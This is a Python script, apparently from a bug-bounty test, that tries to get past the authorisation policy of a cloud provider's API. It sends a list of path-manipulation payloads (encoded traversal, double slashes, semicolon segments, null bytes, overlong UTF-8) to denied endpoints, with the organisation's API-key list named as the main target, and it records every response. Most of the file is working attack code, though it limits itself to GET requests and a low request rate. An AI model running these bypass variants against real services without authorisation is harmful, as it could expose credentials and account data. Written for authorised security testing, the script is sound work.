#!/usr/bin/env python3
"""
H1 final axis — path normalisation vs policy mapping.

Service-level enforcement held on every clean path (41/42 denied). The remaining
question is whether the component that *routes* a request and the component that
*authorises* it agree on what the path is.

If the policy engine matches on the raw path but the router normalises it first
(or vice versa), then a variant that routes to /v2/instance while failing to match
the "compute" rule reaches the handler anyway. That is the classic way policy
engines are bypassed, and it is invisible to a clean-path sweep.

Signature note: EXO2 signs `req.URL.EscapedPath()`, and we sign the exact bytes we
send. So a mismatch between what we sign and what the server canonicalises is itself
part of the experiment.

GET only. No resource IDs (FO-14). Rate limited well under 10 req/s.
"""

import base64
import hashlib
import hmac
import json
import os
import ssl
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone

ZONE = os.environ.get("EXO_ZONE", "ch-gva-2")
HOST = f"api-{ZONE}.exoscale.com"
KEY = os.environ.get("EXO_KEY")
SECRET = os.environ.get("EXO_SECRET")
INTIGRITI_USER = os.environ.get("INTIGRITI_USER", "gorib")
REQ_INTERVAL = 0.35

if not KEY or not SECRET:
    sys.exit("set EXO_KEY and EXO_SECRET in the environment first")

# Denied targets worth reaching. /v2/api-key is the prize: the org's credential list.
TARGETS = ["/v2/api-key", "/v2/instance"]

# Each variant should route to the same handler as the baseline if the server
# normalises, while potentially failing an exact-match policy rule.
def variants(p):
    name = p.rsplit("/", 1)[1]                      # e.g. "instance"
    enc = "%" + format(ord(name[0]), "02x") + name[1:]   # first char percent-encoded
    return [
        ("baseline",          p),
        ("trailing slash",    p + "/"),
        ("double slash",      f"/v2//{name}"),
        ("leading double",    f"//v2/{name}"),
        ("dot segment",       f"/v2/./{name}"),
        ("parent traversal",  f"/v2/dns-domain/../{name}"),
        ("encoded traversal", f"/v2/dns-domain/..%2f{name}"),
        ("semicolon param",   f"/v2/{name};x=1"),
        ("semicolon dotdot",  f"/v2/dns-domain/..;/{name}"),
        ("pct-encoded char",  f"/v2/{enc}"),
        ("uppercase",         f"/v2/{name.upper()}"),
        ("capitalised",       f"/v2/{name.capitalize()}"),
        ("trailing dot",      f"/v2/{name}."),
        ("trailing space",    f"/v2/{name}%20"),
        ("trailing null",     f"/v2/{name}%00"),
        ("utf8 overlong",     f"/v2/{name}%c0%af"),
    ]


def sign(method, path):
    expires = int(time.time()) + 600
    msg = "\n".join([f"{method} {path}", "", "", "", str(expires)])
    sig = hmac.new(SECRET.encode(), msg.encode(), hashlib.sha256).digest()
    return (f"EXO2-HMAC-SHA256 credential={KEY},expires={expires},"
            f"signature={base64.b64encode(sig).decode()}")


def call(path):
    req = urllib.request.Request(f"https://{HOST}{path}", method="GET")
    req.add_header("Authorization", sign("GET", path))
    req.add_header("X-Intigriti-Username", INTIGRITI_USER)
    req.add_header("Accept", "application/json")
    try:
        with urllib.request.urlopen(
            req, timeout=25, context=ssl.create_default_context()
        ) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:                          # noqa: BLE001 — fail loud
        return None, f"TRANSPORT-ERROR: {e!r}"


def main():
    print(f"zone={ZONE}  host={HOST}")
    print("403 = policy denied (correct) · 401 = signature mismatch (not a result)")
    print("404 = routed nowhere (correct) · 200 = REACHED THE HANDLER\n")

    out, hits = f"h1-pathvariants-{ZONE}.jsonl", []
    with open(out, "w") as fh:
        for target in TARGETS:
            print(f"--- {target} ---")
            for label, path in variants(target):
                status, body = call(path)
                fh.write(json.dumps({
                    "utc": datetime.now(timezone.utc).isoformat(timespec="seconds"),
                    "zone": ZONE, "target": target, "variant": label, "path": path,
                    "status": status, "bytes": len(body), "body": body[:4000],
                }) + "\n")
                if status == 200:
                    mark = "HIT!"
                    hits.append((target, label, path, len(body)))
                elif status is None:
                    mark = "ERR "
                else:
                    mark = "    "
                print(f"  [{mark}] {status!s:>4} {len(body):>6}b  {label:<18} {path}")
                if mark in ("HIT!", "ERR "):
                    print(f"          {body[:220]}".replace("\n", " "))
                time.sleep(REQ_INTERVAL)
            print()

    print(f"full responses -> {out}")
    if hits:
        print("\n*** a denied endpoint returned 200 via a path variant ***")
        for target, label, path, n in hits:
            print(f"    {target}  via {label}:  {path}  ({n} bytes)")
        print("\nCheck the body holds REAL org data before calling this anything.")
        print("An empty 200 or a redirect page is not a policy bypass.")
    else:
        print("\nNo variant reached a denied handler. Routing and policy agree on the")
        print("path. H1 closes as a clean negative — log it and move to H3 (SOS ACLs).")


if __name__ == "__main__":
    main()
